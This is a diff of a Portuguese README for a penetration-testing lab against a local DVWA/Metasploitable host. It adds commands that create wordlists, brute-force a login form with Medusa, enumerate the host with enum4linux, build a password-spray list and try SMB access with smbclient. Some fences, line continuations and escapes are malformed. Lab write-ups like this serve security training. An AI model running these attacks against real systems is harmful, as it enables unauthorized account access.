@@ -13,17 +13,34 @@ Este repositório documenta o processo de análise de vulnerabilidades no Damn V
 
 ## 🚀 Execução
 ### 1. Preparação
-As wordlists utilizadas podem ser encontradas na pasta `/wordlists`.
+criar as wordlists
+Wordlists
 
-### 2. Comando Medusa
-O comando utilizado para o ataque de força bruta foi:
+''bash
+echo -e "users\nadmin\nmsfadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 
-```bash
-medusa -h 192.168.56.105 \
-  -U wordlists/users.txt \
-  -P wordlists/pass.txt \
-  -M http \
-  -m "PAGE:/dvwa/login.php" \
-  -m "FORM:username=^USER^&password=^PASS^&Login=Login" \
-  -m "FAIL:Login failed" \
-  -t 6
+Utilizando o Medusa para Simular o Ataque para obter acesso
+
+''bash
+medusa -h 192.168.56.105 -U users.txt -P pass.txt -M http 
+-m PAGE:'/dvwa/login.php' /
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' /
+-m 'FAIL=Login failed' -t 6
+
+Simulando um Cenario Corporativo Mal configurado
+
+''bash
+enum4linux -a 192.168.56.105 | tee enum4_output.txt
+less enum4_output.txt
+
+Criando Lista de Usuario e Senhas
+
+''bash
+echo -e "user\msfadmin\nservice" > sub_users.txt
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+Testando Acesso Utilizando Smbclient
+
+''bash
+smbclient -L //192.168.56.105 -U msfadmin
